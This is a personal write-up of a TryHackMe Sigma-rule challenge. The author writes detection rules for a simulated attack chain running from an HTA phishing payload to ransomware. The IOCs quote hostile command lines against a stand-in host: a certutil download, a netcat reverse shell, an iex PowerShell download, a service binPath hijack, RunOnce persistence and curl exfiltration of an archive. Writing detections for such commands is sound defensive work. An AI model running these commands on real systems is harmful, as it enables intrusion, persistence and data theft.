---
title: TryHackMe SigHunt Challenge
date: 2026-03-03 00:00:00 +0100
categories: [Detection Mechanisms]
tags: [tryhackme, sigma, detection, soc, challenge, logging]
series: ""
series_order: 
---

> **Disclaimer**: This post contains my personal notes and methodology for the respective TryHackMe room. All the credits for the room and the lab environment go to the original creators at TryHackMe. **Flags are not revealed** to preserve the challenge for others. 
{: .prompt-info}

## Objective

You will be acting as one of the Detection Engineers that has to craft Sigma Rules based on the Indicators of Compromise (IOCs) collected by Incident Responders. 

There are 9 challenges. 9 IOCs or threat intel, and you have to write a sigma rule for each of them. 

The attack chain is as follows:

1. Execution of **malicious HTA payload** from a phishing link. 
2. Execution of **certutil tool** to download **netcat** binary. 
3. **Netcat execution**
4. Enumeration of privilege escalation vectors through **PowerUp.ps1**
5. Abused service modification privileges to achieve **System privileges**.
6. Collected sensitive data by archiving via **7-zip**. 
7. Exfiltrated sensitive data through **curl** binary.
8. Executed ransomware with **huntme** as file extension. 

For each part of this attack chain, we have a set of IOCs at our disposal, and must use them to create Sigma rules to detect each of these stages. 
***

## Malicious HTA payload

- Parent Image: chrome.exe
- Image: mshta.exe
- Command Line: C:\Windows\SysWOW64\mshta.exe C:\Users\victim\Downloads\update.hta

Over the course of writing a sigma rule for this, we discover a few things:

1. Sigma rules require an EventID when the service is sysmon, atleast in this challenge. 
2. Sigma rule shouldn't be too generic. I initally had `update.hta` within the CommandLine detection rule, but had to remove it. 

The final sigma rule is as follows: 

```
title: Detect HTA Payload usage 
id: 019cb3ea-439c-783f-80fe-536309fa23a1 
status: test
description: A malicious HTA payload is executed from a phishing link. Involves chrome, and mshta.exe 
author: temp 
date: 3/3/2026 
modified: 
logsource:
  product: windows
  service: sysmon
  category: process_creation
detection:
  selection:
    EventID: 1
    CommandLine|contains: 
        - 'mshta.exe'
    Image|endswith:
        - 'mshta.exe'
    ParentImage|endswith:
        - 'chrome.exe'
  condition: selection 

```

## Certutil Download

- Image: `certutil.exe`
- CommandLine: `certutil -urlcache -split -f http[:]//huntmeplz[.]com/ransom[.]exe ransom.exe`

Here too, the `huntme` part of it, when used in detection, gives the error of being too generic. And to focus on the IOC alone. 

A further note, combining all flags as one detection, such as `certutil -urlcache -split -f` does not work. It will say "no hits found". 

The final sigma rule is as follows:

```
title: Detect Download through certutil
id: 019cb3f6-e38b-70ff-960c-926ad5d33b9a 
status: test
description: Certutil is used to download a binary, which may be netcat according to threat intel
author: temp 
date: 3/3/2026 
modified: 
logsource:
  product: windows
  service: sysmon
  category: process_creation
detection:
  selection:
    EventID: 1
    CommandLine|contains|all: 
        - 'certutil'
        - '-urlcache'
        - '-split'
        - '-f'
    Image|endswith:
        - 'certutil.exe'
  condition: selection 
```

## Netcat usage

- Image: `nc.exe`
- CommandLine: `C:\Users\victim\AppData\Local\Temp\nc.exe huntmeplz[.]com 4444 -e cmd.exe`
- MD5 Hash: 523613A7B9DFA398CBD5EBD2DD0F4F38

For this one, we are given an MD5 hash, and the image. However, something always went wrong. 

One of the hints is to use the Hashes field to capture all netcat executions without relying on its filename (Image) alone. So some netcat binaries may have names other than `nc.exe` but the hash maybe the same, and vice versa. 

Final Sigma rule for this: 

```
title: Netcat execution - reverse shell creation
id: 019cb3fb-b2f8-7818-96cf-c56cf0625368 
status: test
description: Netcat is used to establish a reverse shell on the victim machine. Cmd.exe is set up on a port. 
author: temp 
date: 3/3/2026 
modified: 
logsource:
  product: windows
  service: sysmon
  category: process_creation
detection:
  selection_main:
    EventID: 1
    CommandLine|contains:
        - ' -e '
  selection_image:
    Image|contains:
        - 'nc.exe'
  selection_hashes:
    Hashes|contains:
        - '523613A7B9DFA398CBD5EBD2DD0F4F38'
  condition: selection_main and (selection_image or selection_hashes)
```

## PowerUp Enumeration

- Image: `powershell.exe`
- CommandLine: ` powershell "iex(new-object net.webclient).downloadstring('http[:]//huntmeplz[.]com/PowerUp[.]ps1'); Invoke-AllChecks;"`

> PowerUp is a collection of powershell scripts designed for Windows Privilege Escalation. It is used for enumerating different ways to escalate privileges. 
{: .prompt-info}

Final Sigma Rule:

```
title: PowerUp Enumeration
id: 019cb41b-e567-769d-b12a-2f7bb6f49d12 
status: test
description: Powershell is used to download the PowerUp powershell script to enumerate different ways of escalating privileges
author: temp 
date: 3/3/2026 
modified: 
logsource:
  product: windows
  service: sysmon
  category: process_creation
detection:
  selection:
    EventID: 1
    CommandLine|contains:
        - 'PowerUp.ps1'
        - 'downloadstring'
        - 'Invoke-AllChecks'
    Image|endswith:
        - 'powershell.exe'
  condition: selection
```

## Service Modification

- Image: `sc.exe`
- CommandLine: `sc.exe config SNMPTRAP binPath= "C:\Users\victim\AppData\Local\Temp\rev.exe huntmeplz.com 4443 -e cmd.exe"`

The `SNMPTRAP` service is modified. Its binary now points to the reverse shell. 

This one really bugged. I had the word "reverse" in my description, and the sigma rule kept failing, saying the string "rev" was used and that shouldn't be used, since it makes the rule too specific. 

Final sigma rule:

```
title: Service Binary Modification
id: 019cb41f-bec5-7d4e-90cf-0d7112e24664 
status: test
description: sc.exe is used to modify a service
author: temp 
date: 3/3/2026 
modified: 
logsource:
  product: windows
  service: sysmon
  category: process_creation
detection:
  selection:
    EventID: 1
    Image|endswith:
        - '\sc.exe'
    CommandLine|contains|all:
        - ' config '
        - ' binPath= '
        - ' -e '
  condition: selection
```

## RunOnce Persistence

- Image: reg.exe
- CommandLine: `reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v MicrosoftUpdate /t REG_SZ /d "C:\Windows\System32\cmdd.exe"`

This one was easier. 

Final Sigma Rule:

```
title: RunOnce
id: 019cb42f-e34f-70e6-af42-693e63ce2361 
status: test
description: registry key modified, to run once
author: temp 
date: 3/3/2026 
modified: 
logsource:
  product: windows
  service: sysmon
  category: process_creation
detection:
  selection:
    EventID: 1
    Image|endswith:
        - '\reg.exe'
    CommandLine|contains:
        - 'reg'
        - ' add '
        - '\RunOnce'
  condition: selection
```

## 7-zip for archiving

- Image: `7z.exe`
- CommandLine: `7z a exfil.zip * -p`

Final Sigma Rule:

```
title: 7zip for archiving
id: 019cb432-d78d-7545-bd43-f8b05d1bf10f
status: test
description: 7-zip used
author: temp 
date: 3/3/2026 
modified: 
logsource:
  product: windows
  service: sysmon
  category: process_creation
detection:
  selection:
    EventID: 1
    Image|endswith:
        - '\7z.exe'
    CommandLine|contains|all:
        - ' a '
        - ' -p'
  condition: selection
```

## curl binary for exfiltration

- Image: `curl.exe`
- CommandLine: `curl -d @exfil.zip http[:]//huntmeplz[.]com[:]8080/`

Final Sigma rule:

```
title: curl for exfiltration
id: 019cb435-23d8-7de7-a2e1-85d8fb93d51f
status: test
description: curl used for exfiltrating data
author: temp 
date: 3/3/2026 
modified: 
logsource:
  product: windows
  service: sysmon
  category: process_creation
detection:
  selection:
    EventID: 1
    Image|endswith:
        - '\curl.exe'
    CommandLine|contains|all:
        - ' -d '
  condition: selection
```

## Ransomware to encrypt files

- Image: `ransom.exe`
- TargetFilename: `*.huntme`

Here, if you view the sample event log, the event ID is 11, since an encrypted file is created, so it comes under file_creation. 

Final Sigma Rule:

```
title: final file encryption
id: 019cb435-23d8-7de7-a2e1-85d8fb93d51f
status: test
description: files encrypted
author: temp 
date: 3/3/2026 
modified: 
logsource:
  product: windows
  service: sysmon
  category: file_creation
detection:
  selection:
    EventID: 11
    TargetFilename|endswith:
        - '.huntme'
  condition: selection
```

***

## Key Takeaways

- It's important to not be too generic or too specific when creating sigma rules.
- Better to stick to proper IOCs
- Windows Sysmon is quite good, and standard, which helps in searching for the required parameters for writing the rule. Like in the case of `Hashes`. 

